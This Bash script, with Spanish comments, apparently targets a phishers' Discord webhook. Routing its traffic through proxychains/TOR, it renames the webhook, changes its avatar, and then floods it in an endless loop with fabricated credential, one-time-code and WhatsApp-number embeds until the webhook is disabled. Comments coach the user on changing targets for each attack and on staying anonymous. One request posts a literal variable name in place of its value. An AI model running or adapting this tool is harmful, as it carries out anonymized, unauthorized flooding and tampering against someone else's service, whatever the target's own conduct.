#!/bin/bash
#WEBHOOK objetivo, normalmente lo cambia cada vez que les lleno el server de spam
source colors.sh
WEBHOOK=""

check_webhook() {
  local response
  response=$(proxychains4 curl -s "$WEBHOOK")

  local code
  code=$(echo "$response" | jq -r '.code')

  if [ "$code" = "10015" ]; then
  log_error "Webhook desactivado, bien hecho"
  echo -e "$RED$(cat skull)$RESET"
  exit
  fi

  return 0
}

check_webhook


#DEBES CAMBIAR EL WEBHOOK en cada ataque, normalmente los cambian cada rato que se satura de basura su plataforma
WEBHOOK_NAME=$(proxychains4 curl -s "$WEBHOOK" | jq -r '.name')
IMAGE_NUMBER=$((RANDOM % 9 + 1))
IMAGE="images/${IMAGE_NUMBER}.png"
AVATAR_B64=$(base64 -w 0 "$IMAGE")
NAMES=(
    "Vibe-Coding ASF"
    "GTA VI"
    "CU PUMAS CU PUMAS 🗣🔥🔥"
    "我们一起打飞机把"
)

NAME=${NAMES[$((RANDOM % ${#NAMES[@]}))]}
if [[ " ${NAMES[*]} " != *" $NAME "* ]]; then
  log_info "${CYAN}Imagen seleccionada:${RESET}${GREEN}$IMAGE_NUMBER.png${RESET} y ${GREEN}$NAME${RESET}"
  JSON_BOT_NAME=$(jq -n \
    --arg name "$NAME" \
    --arg avatar "data:image/png;base64,$AVATAR_B64" \
    '{
      name: $name,
      avatar: $avatar
    }'
  )
  #No te preocupes, las imagenes no tienen metadatos, sólo de la fecha de creación, además Discord elimina los metadatos por completo, así que no hay nada que preocuparse, por si acaso usamos proxychains4 (que en pocas palabras enruta nuestra conexión mediante TOR)
  proxychains4 curl -X PATCH \
  -H "Content-Type: application/json" \
  -d "$JSON_BOT_NAME" \
  "$WEBHOOK"
fi


while true; do
  IP="$(shuf -i 1-255 -n 1).$(shuf -i 0-255 -n 1).$(shuf -i 0-255 -n 1).$(shuf -i 1-254 -n 1)"
  COUNTRY="Mexico"
  #selecciona usuarios
  NUM=$((RANDOM % 2 + 1))
  EMAIL=$(shuf -n $NUM xato-net-10-million-usernames.txt \
  | paste -sd "" -)@comunidad.unam.mx
  #selecciona contraseña
  PASSWORD=$(shuf -n 1 rockyou.txt)
  #Use bt porque tuve problemas para meter el ` y vi que la opción viable era una variable, los ` se usan en Discord para resaltar texto con un fondo gris por lo que tengo entendido
  JSON_DATA_EMAIL=$(jq -n \
    --arg email "$EMAIL" \
    --arg password "$PASSWORD" \
    --arg ip "$IP" \
    --arg country "$COUNTRY" \
    --arg date "$(date +%s%3N)" \
    --arg bt '`' \
    '{
      "embeds": [{
        "title": "Nuevo Acceso",
        "color": 16711680,
        "fields": [
          {"name": "Usuario",   "value": ($bt + $email + $bt)},
          {"name": "Password",  "value": ($bt + $password + $bt)},
          {"name": "IP",        "value": ($bt + $ip + $bt),         "inline": true},
          {"name": "Ubicación", "value": ($bt + $country + $bt),    "inline": true}
        ],
        "timestamp": $date
      }]
    }')
  # Enviar al webhook (por proxy)
  proxychains4 curl -s -H "Content-Type: application/json" \
    -X POST \
    -d "$JSON_DATA_EMAIL" \
    "$WEBHOOK"
  log_info "Enviado"
  log_json "${YELLOW}${JSON_DATA_EMAIL}${RESET}"
  check_webhook
  sleep 5

  #Código falso de autenticación de Outlook
  EMAIL_ENCODE=$(jq -rn --arg u "$EMAIL" '$u | @uri')
  JSON_AUTH_EMAIL=$(jq -n \
    --arg email_encode "$EMAIL_ENCODE" \
    --arg code "$(shuf -i 100000-999999 -n 1)" \
    --arg date "$(date +%s%3N)" \
    --arg bt '`' \
    '{
      "embeds": [{
        "title": "Código P2P Recibido",
        "color": 3066993,
        "fields": [
          {"name": "Usuario",           "value": ($bt + $email_encode + $bt)},
          {"name": "Código Ingresado",  "value": ($bt + $code + $bt)}
        ],
        "timestamp": $date
      }]
    }')
  proxychains4 curl -s -H "Content-Type: application/json" \
    -X POST \
    -d "JSON_AUTH_EMAIL" \
    "$WEBHOOK"
  log_json "${YELLOW}$JSON_AUTH_EMAIL${RESET}"
  check_webhook
  sleep 2
  #Crear un número falso en WhatsApp
  PREFIXES=(55 56 427 588 591 592 593 594 595 596 597 599 711 712 713 714 716 717 718 719 721 722 723 724 725 726 728 729 743 751 761 767)
  PREFIX=${PREFIXES[$RANDOM % ${#PREFIXES[@]}]}
  SUFFIX=$(printf "%08d" $((RANDOM % 100000000)))
  PHONE_NUMBER="\`+52 ($PREFIX$SUFFIX)\`"
  JSON_NUMBER=$(jq -rn \
  --arg number "$PHONE_NUMBER" \
  --arg ip "$IP" \
  --arg date "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"\
  '{
    "content": null,
    "embeds":
    [
      {
      "title": "📱 Información de WhatsApp Recibida",
      "color": 3447003,
      "fields":[
        {"name": "📞 Número de WhatsApp",   "value": $number,  "inline": false},
        {"name": "🌍 IP y Ubicación",      "value": ("IP: " + $ip + "\nUbicación: Mexico City, MX"), "inline": false}
      ],
      "timestamp": $date,
      "footer": {"text": "Microsoft - WhatsApp Sync"}
      }
    ]
  }')
  proxychains4 curl -X POST "$WEBHOOK" \
    -H "Content-Type: application/json" \
    -d "$JSON_NUMBER"
  log_json "${YELLOW}$JSON_NUMBER${RESET}"
  check_webhook
  sleep 2

  JSON_NUMBER_AUTH=$(jq -rn \
  --arg number "$PHONE_NUMBER" \
  --arg ip "$IP" \
  --arg date "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"\
  --arg code "$(shuf -i 100000-999999 -n 1)" \
  '{
    "content": null,
    "embeds":
    [
      {
      "title": "🔒 Código de Verificación Recibido",
      "color": 3066993,
      "fields":[
        {"name": "📞 Número de WhatsApp",   "value": $number,  "inline": false},
        {"name": "🔑 Código de Pantalla",      "value": $code, "inline": false},
        {"name": "🌍 IP y Ubicación",      "value": ("IP: " + $ip + "\nUbicación: Mexico City, MX"), "inline": false}
      ],
      "timestamp": $date,
      "footer": {"text": "WhatsApp Security Verification"}
      }
    ]
  }')
   proxychains4 curl -X POST "$WEBHOOK" \
    -H "Content-Type: application/json" \
    -d "$JSON_NUMBER_AUTH"
  log_json "${YELLOW}$JSON_NUMBER_AUTH${RESET}"
  check_webhook
done


